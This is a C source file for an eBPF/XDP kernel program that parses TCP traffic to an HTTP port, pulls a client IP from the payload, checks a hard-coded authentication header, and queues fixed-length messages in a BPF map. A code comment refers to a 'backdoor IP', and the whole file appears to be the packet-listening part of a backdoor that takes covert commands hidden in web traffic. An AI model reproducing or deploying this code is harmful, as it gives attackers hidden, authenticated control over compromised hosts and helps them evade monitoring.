#include "nyako_kern.h"

SEC("nyako_kern")
int process_packet(struct xdp_md *ctx)
{
  int action = XDP_PASS;

  struct ethhdr *ethh;
  struct iphdr *iph;
  struct tcphdr *tcph;

  struct hdr_cursor header;

  int ip_hlen, tcp_hlen, eth_hlen;
  unsigned int payload_len, message_len;

  void *data_end = (void *)(long)ctx->data_end;
  void *data = (void *)(long)ctx->data;

  unsigned char *payload;
  unsigned short tot_len;

  struct message_details *record;
  unsigned long int *message_count;

  __u32 message_count_key = 0;
  __u32 message_queue_key = 0;

  // start next header cursor position at data start
  header.pos = data;

  // parse eth header
  ethh = header.pos;
  eth_hlen = ETH_HLEN;
  if (header.pos + eth_hlen > data_end)
    goto out;

  header.pos += eth_hlen;

  if (ethh->h_proto < 0)
  {
    action = XDP_ABORTED;
    goto out;
  }

  if (ethh->h_proto != bpf_htons(ETH_P_IP))
  {
    goto out;
  }

  // parse ip header
  if (header.pos + sizeof(*iph) > data_end)
    goto out;

  iph = header.pos;

  ip_hlen = iph->ihl * 4;

  if (ip_hlen < sizeof(*iph))
  {
    action = XDP_ABORTED;
    goto out;
  }

  header.pos += ip_hlen;

  if (iph->protocol != IPPROTO_TCP)
  {
    goto out;
  }

  // parse tcp header
  if ((header.pos + sizeof(*tcph)) > data_end)
  {
    goto out;
  }

  tcph = header.pos;
  tcp_hlen = tcph->doff * 4;

  if (tcp_hlen < sizeof(*tcph))
  {
    goto out;
  }

  if (bpf_ntohs(tcph->dest) != HTTP_PORT)
  {
    goto out;
  }

  // parse tcp data
  header.pos += tcp_hlen;

  tot_len = bpf_ntohs(iph->tot_len);

  if (tot_len > 0xffff)
  {
    action = XDP_ABORTED;
    goto out;
  }

  payload_len = tot_len - (ip_hlen + tcp_hlen);
  message_len = payload_len;

  if (payload_len == 0)
  {
    goto out;
  }

  if ((header.pos + CLIENT_IP_OFFSET + IP_BUF_SIZE) > data_end)
  {
    goto out;
  }

  payload = (unsigned char *)(header.pos + CLIENT_IP_OFFSET);
  message_len -= CLIENT_IP_OFFSET;

  message_count = bpf_map_lookup_elem(&message_count_map, &message_count_key);

  if (message_count == NULL)
  {
    action = XDP_ABORTED;
    goto out;
  }

  *message_count += 1;
  message_queue_key = *message_count % MESSAGE_QUEQUE_SIZE;

  record = bpf_map_lookup_elem(&message_queque_map, &message_queue_key);

  if (record == NULL)
  {
    action = XDP_ABORTED;
    goto out;
  }

  // TODO fix: to set client IP and not backdoor IP
  // set client ip
  for (unsigned int i = 0; i < IP_BUF_SIZE; i++)
  {
    if (payload[i] == '\r')
    {
      record->ip[i] = '\0';
      payload += i;
      message_len -= i;
      break;
    }

    record->ip[i] = payload[i];
  }

  // skip other headers
  if (((void *)payload + EXTRA_HEADER_SIZE) > data_end)
  {
    goto out;
  }
  payload += EXTRA_HEADER_SIZE;
  message_len -= EXTRA_HEADER_SIZE;

  // check auth header
  if (((void *)payload + AUTH_HEADER_SIZE) > data_end)
  {
    goto out;
  }

  for (unsigned int i = 0; i < AUTH_HEADER_SIZE; i++)
  {
    if (payload[i] != *(AUTH_HEADER + i))
    {
      goto out;
    }
  }

  message_len -= CONTROL_CHAR_SIZE;

  if (((void *) payload + MESSAGE_BUF_SIZE) > data_end)
  {
    goto out;
  }

  if (message_len != (MESSAGE_BUF_SIZE - 1))
  {
    goto out;
  }

  memcpy(record->message, payload, MESSAGE_BUF_SIZE - 1);
  record->message[MESSAGE_BUF_SIZE - 1] = '\0';

out:
  return action;
}

char _license[] SEC("license") = "Dual MIT/GPL";
